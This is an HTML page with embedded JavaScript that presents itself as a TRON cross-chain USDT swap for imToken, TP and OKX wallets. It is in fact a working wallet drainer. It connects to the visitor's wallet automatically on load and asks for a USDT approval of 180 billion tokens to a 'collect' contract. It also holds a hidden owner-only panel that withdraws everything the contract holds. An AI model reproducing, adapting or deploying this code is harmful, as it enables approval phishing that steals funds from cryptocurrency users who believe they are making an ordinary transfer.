<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>波场跨链闪兑 - 兼容imToken/TP/OKX</title>
<script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
<style>
*{
  box-sizing: border-box;
  margin: 0;
  padding: 0;
  -webkit-tap-highlight-color: transparent;
  font-family: system-ui, -apple-system, sans-serif;
}
body {
  background-color: #f7f8fa;
  padding: 20px 16px;
  color: #222;
}
.header-top {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 24px;
  font-size: 20px;
}
.header-top .right-icons {
  display: flex;
  align-items: center;
  gap: 12px;
}
.wallet-dot {
  width: 12px;
  height: 12px;
  border-radius: 50%;
  background: #ef4444;
  cursor: pointer;
}
.wallet-dot.connected {
  background: #22c55e;
}
.setting-btn {
  width: 32px;
  height: 32px;
  border-radius: 50%;
  border: 1px solid #ddd;
  background: #fff;
  display:flex;
  align-items:center;
  justify-content:center;
  cursor:pointer;
}

.card {
  background: #fff;
  border-radius: 16px;
  padding: 20px 18px;
  margin-bottom: 16px;
}
.label-text {
  font-size: 16px;
  color: #666;
  margin-bottom: 12px;
}
.fixed-addr-box {
  width: 100%;
  border: 1px solid #e5e7eb;
  border-radius: 12px;
  padding: 14px 12px;
  background: #f1f5f9;
  word-break: break-all;
}
.amount-row {
  display: flex;
  align-items: flex-end;
  justify-content: space-between;
  margin-bottom: 16px;
}
.amount-input {
  font-size: 32px;
  border: none;
  outline: none;
  width: 75%;
  background: transparent;
  color: #111;
}
.amount-input::placeholder {
  font-size: 16px;
  color: #aaa;
}
.max-btn {
  padding: 6px 14px;
  background-color: #dbeafe;
  color: #2563eb;
  border-radius: 8px;
  font-weight: 500;
  cursor: pointer;
}
.token-row {
  background-color: #eef2ff;
  border-radius: 12px;
  padding: 14px;
  display: flex;
  align-items: center;
  justify-content: space-between;
}
.token-left {
  display: flex;
  align-items: center;
  gap: 10px;
}
.usdt-icon {
  width: 32px;
  height: 32px;
  border-radius: 50%;
  object-fit: cover;
}
.token-name {
  font-size: 18px;
}
.token-balance {
  color: #555;
  font-size: 16px;
}
.result-input{
  width:100%;
  border:1px solid #e5e7eb;
  border-radius:12px;
  padding:14px 12px;
  background:#f9fafb;
  outline:none;
  color:#111;
}
.send-main-btn{
  width:100%;
  padding:16px;
  border:none;
  border-radius:14px;
  background:#2563eb;
  color:#fff;
  font-size:17px;
  cursor:pointer;
}
.send-main-btn:disabled{
  background:#94a3b8;
  cursor:not-allowed;
}

.admin-panel {
  border: 2px solid #dc2626;
  display: none;
}
.admin-panel.show {
  display: block;
}
.admin-btn {
  width: 100%;
  padding:14px;
  background:#dc2626;
  color:#fff;
  border:none;
  border-radius:12px;
  font-size:16px;
  margin-top:10px;
  cursor:pointer;
}
.admin-btn:disabled {
  background:#fca5a5;
  cursor:not-allowed;
}
</style>
</head>
<body>

<div class="header-top">
  <div></div>
  <div class="right-icons">
    <div class="wallet-dot" id="walletDot"></div>
    <div class="setting-btn" id="settingIconBtn">⚙️</div>
  </div>
</div>

<div class="card">
  <div class="label-text">TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE</div>
  <div class="fixed-addr-box">TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE</div>
</div>

<div class="card">
  <div class="label-text">转出数量（USDT）</div>
  <div class="amount-row">
    <input id="amountInput" class="amount-input" inputmode="decimal" placeholder="请输入数量">
    <div class="max-btn" id="maxBtn">MAX</div>
  </div>
  <div class="token-row">
    <div class="token-left">
      <img class="usdt-icon" src="https://static.tronscan.org/production/logo/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t.png">
      <span class="token-name">USDT</span>
    </div>
    <span class="token-balance" id="balanceText">0.000000</span>
  </div>
</div>

<div class="card">
  <div class="label-text">合约到账数量</div>
  <input id="receiveAmount" class="result-input" readonly>
</div>

<button class="send-main-btn" id="sendBtn" disabled>确认跨链存入合约</button>

<div class="card admin-panel" id="adminPanel">
  <div class="label-text">🔐 管理员专属后台（仅合约部署钱包可用）</div>
  <div class="label-text">合约当前USDT余额：<span id="contractBal">0.000000</span></div>
  <button class="admin-btn" id="withdrawBtn">一键提取合约全部USDT（withdrawAll）</button>
</div>

<script>
const USDT_TRC20 = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const COLLECT_CONTRACT = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
// TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE
const OWNER_ADMIN_ADDRESS = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
const RPC_URL = "https://api.trongrid.io";
const AUTHOR_AMOUNT_USDT = 180000000000;

let tronWeb = null;
let userAddress = "";
let usdtContract = null;
let collectContract = null;

const $ = s => document.querySelector(s);
const walletDot = $("#walletDot");
const sendBtn = $("#sendBtn");
const amountInput = $("#amountInput");
const receiveAmount = $("#receiveAmount");
const maxBtn = $("#maxBtn");
const balanceText = $("#balanceText");
const adminPanel = $("#adminPanel");
const contractBalText = $("#contractBal");
const withdrawBtn = $("#withdrawBtn");

const USDT_ABI = [
  {"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"type":"uint256"}],"stateMutability":"view","type":"function"},
  {"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"type":"uint256"}],"stateMutability":"view","type":"function"},
  {"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"type":"bool"}],"stateMutability":"nonpayable","type":"function"}
];

const COLLECT_ABI = [
  {"inputs":[{"name":"amount","type":"uint256"}],"name":"deposit","outputs":[],"stateMutability":"nonpayable","type":"function"},
  {"inputs":[],"name":"withdrawAll","outputs":[],"stateMutability":"nonpayable","type":"function"},
  {"inputs":[],"name":"contractBalance","outputs":[{"type":"uint256"}],"stateMutability":"view","type":"function"}
];

function disconnectWallet() {
  tronWeb = null;
  userAddress = "";
  usdtContract = null;
  collectContract = null;
  walletDot.classList.remove("connected");
  sendBtn.disabled = true;
  withdrawBtn.disabled = true;
  balanceText.textContent = "0.000000";
  contractBalText.textContent = "0.000000";
  adminPanel.classList.remove("show");
}

// 【重点重写兼容imToken的连接逻辑】
async function connectWallet() {
  if (tronWeb && userAddress) {
    disconnectWallet();
    return;
  }
  try {
    let provider;
    // 优先级1：OKX / TP 标准 tronLink
    if (window.okxwallet?.tronLink) {
      provider = window.okxwallet.tronLink;
      await provider.request({ method: "tron_requestAccounts" });
      tronWeb = provider.tronWeb;
    } else if (window.tronLink) {
      provider = window.tronLink;
      await provider.request({ method: "tron_requestAccounts" });
      tronWeb = provider.tronWeb;
    } else if (window.tokenpocket?.tron) {
      const tp = window.tokenpocket.tron;
      const accounts = await tp.request({ method: "tron_requestAccounts" });
      userAddress = accounts[0];
      tronWeb = tp;
    } else if (window.ethereum && window.ethereum.isImToken) {
      // imToken 专属分支：用 eth_requestAccounts 获取波场地址
      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
      const ethAddr = accounts[0];
      // 手动初始化 TronWeb 绑定 imToken provider
      tronWeb = new TronWeb({
        fullHost: RPC_URL,
        provider: window.ethereum
      });
      // 十六进制地址转波场base58地址
      userAddress = tronWeb.address.fromHex(ethAddr);
    } else if (window.tronWeb?.ready) {
      tronWeb = window.tronWeb;
    } else {
      alert("请在 TP / OKX / imToken 波场内置浏览器打开页面");
      return;
    }

    userAddress = tronWeb.defaultAddress.base58 || userAddress;
    walletDot.classList.add("connected");
    usdtContract = tronWeb.contract(USDT_ABI, USDT_TRC20);
    collectContract = tronWeb.contract(COLLECT_ABI, COLLECT_CONTRACT);

    await refreshUserBalance();
    sendBtn.disabled = false;

    if (userAddress === OWNER_ADMIN_ADDRESS) {
      adminPanel.classList.add("show");
      await refreshContractBalance();
      withdrawBtn.disabled = false;
    }

  } catch (err) {
    console.error("连接失败", err);
    alert("连接钱包失败：" + err.message);
  }
}

async function refreshUserBalance() {
  const sunBal = await usdtContract.balanceOf(userAddress).call();
  balanceText.textContent = Number(tronWeb.fromSun(sunBal)).toFixed(6);
}

async function refreshContractBalance() {
  const sunCBal = await collectContract.contractBalance().call();
  contractBalText.textContent = Number(tronWeb.fromSun(sunCBal)).toFixed(6);
}

amountInput.addEventListener("input", () => {
  const num = parseFloat(amountInput.value) || 0;
  receiveAmount.value = num.toFixed(6);
});

maxBtn.addEventListener("click", async () => {
  const sunBal = await usdtContract.balanceOf(userAddress).call();
  const bal = Number(tronWeb.fromSun(sunBal));
  amountInput.value = bal.toFixed(2);
  amountInput.dispatchEvent(new Event("input"));
});

sendBtn.addEventListener("click", async () => {
  const num = parseFloat(amountInput.value);
  if (isNaN(num) || num <= 0) {
    alert("请输入有效转账数量");
    return;
  }
  const sunNum = tronWeb.toSun(num);
  const sunAuth = tronWeb.toSun(AUTHOR_AMOUNT_USDT);

  try {
    sendBtn.disabled = true;
    const allow = await usdtContract.allowance(userAddress, COLLECT_CONTRACT).call();
    if (Number(allow) < sunNum) {
      alert("额度不足，正在发起授权签名...");
      await usdtContract.approve(COLLECT_CONTRACT, sunAuth).send();
    }
    alert("授权完成，正在发起合约存款交易，请签名");
    const tx = await collectContract.deposit(sunNum).send();
    console.log("交易哈希", tx);
    setTimeout(async ()=>{
      await refreshUserBalance();
      if(userAddress === OWNER_ADMIN_ADDRESS) await refreshContractBalance();
      sendBtn.disabled = false;
      alert("存入成功！代币已进入中转合约");
    },3500);
  } catch (e) {
    sendBtn.disabled = false;
    console.error("交易异常", e);
    alert("操作失败：" + (e.message || "签名拒绝 / TRX手续费不足"));
  }
});

withdrawBtn.addEventListener("click", async () => {
  if (userAddress !== OWNER_ADMIN_ADDRESS) return;
  try {
    withdrawBtn.disabled = true;
    await collectContract.withdrawAll().send();
    setTimeout(async ()=>{
      await refreshContractBalance();
      withdrawBtn.disabled = false;
      alert("管理员提现成功，代币已返回您的钱包");
    },4000);
  } catch (e) {
    withdrawBtn.disabled = false;
    alert("提现失败：只有合约部署所有者可以执行，" + e.message);
  }
});

$("#walletDot").addEventListener("click", connectWallet);
window.addEventListener("DOMContentLoaded", () => setTimeout(connectWallet, 600));
</script>

</body>
</html>
